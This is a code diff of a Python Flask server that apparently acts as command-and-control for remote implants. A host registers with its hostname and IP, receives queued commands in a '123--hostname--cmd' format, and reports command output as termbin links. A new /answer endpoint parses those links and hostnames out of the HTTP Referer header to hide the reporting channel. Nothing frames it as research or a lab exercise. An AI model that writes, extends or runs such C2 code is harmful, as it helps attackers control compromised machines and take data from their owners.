@@ -3,6 +3,7 @@
 from flask import Flask, request, render_template, jsonify
 from flask_cors import CORS
 
+import requests
 from hashlib import md5
 
 # custom sqlite db methods
@@ -106,16 +107,6 @@ def testdb():
 # APP-RELATED FUNCTIONS
 # ===============================================
 
-# get hosts by hostname
-# ===============================================
-def get_one_host(conn, hostname):
-# def get_one_host(conn, hostname, hash):
-	sql = 'SELECT * FROM hosts WHERE hostname = ?'
-	# sql = 'SELECT * FROM hosts WHERE hostname = ? AND hash = ?'
-	results = db.select_db(conn, sql, (hostname,))
-
-	return results
-# ===============================================
 
 # insert new host
 # ===============================================
@@ -124,16 +115,6 @@ def insert_host(conn, hostname, ip):
 	lastrowid = db.insert_db(conn, sql, (hostname, ip, md5((hostname+ip).encode('utf-8')).hexdigest()))
 
 	return lastrowid
-# ===============================================
-
-
-# get latest cmd by host hash
-# ===============================================
-def get_last_cmd_for_host(conn, hash):
-	sql = 'SELECT command FROM commands WHERE host_hash = ?'
-	command = db.select_db(conn, sql, (hash,))
-
-	return command
 # ===============================================
 
 
@@ -162,10 +143,11 @@ def phase1():
 
 
 	# check if hostname exists in db
-	is_host_registered = get_one_host(conn, hostname)
+	# sample : [[1, 'DESKTOP-AB123', 'bc60fa448aab00f893d746b9190e2ae0', 'windows', '127.0.0.1']]
+	host = (db.get_one_host(hostname)).get_json()
 
-	if len(is_host_registered) != 0:
-		print("host already here")
+	if host:
+		print("[i] host already here")
 	else:
 		print("[!] no host %s registered !" % (hostname))
 		latest_id = insert_host(conn, hostname, ip)
@@ -174,13 +156,15 @@ def phase1():
 
 
 	# check if command to give to host
-	host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
-	latest_cmd_for_host = get_last_cmd_for_host(host_hash)
-	print(latest_cmd_for_host)
+	# host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
 
+	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()
 
-	# return "<RANDINT>--<HOSTNAME>--<CMD>"
-	return "123--%s--%s" % (hostname, latest_cmd)
+	if (len(latest_cmd_for_host) == 0):
+		return ''
+
+	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])
+
 # ===============================================
 
 
@@ -221,10 +205,24 @@ def api_commands_add():
 # endpoint pour recueillir les liens termbin 
 # avec la réponse de la commande précédemment exécutée
 # ===============================================
-@app.route("/answer", methods=['POST'])
+@app.route("/answer")
 def answer():
-	# params = request.get_json()
-	# success = db.api_add_command(params[0], params[1])
-	return "1"
+	# on recupere hostname + lien termbin via le header Referer
+	referrer = request.referrer
+
+	if referrer == None:
+		return ""
+
+	full_referrer = referrer.split(' -- ')
+
+	host = (full_referrer[0]).split(":")[1].split("-00")[0]
+	termbin_url = full_referrer[1]
+
+	# print("host : " + host)
+	# print("termbin_url : " + termbin_url)
+
+	success = db.api_add_answer(host, termbin_url)
+
+	return success
 # ===============================================
 
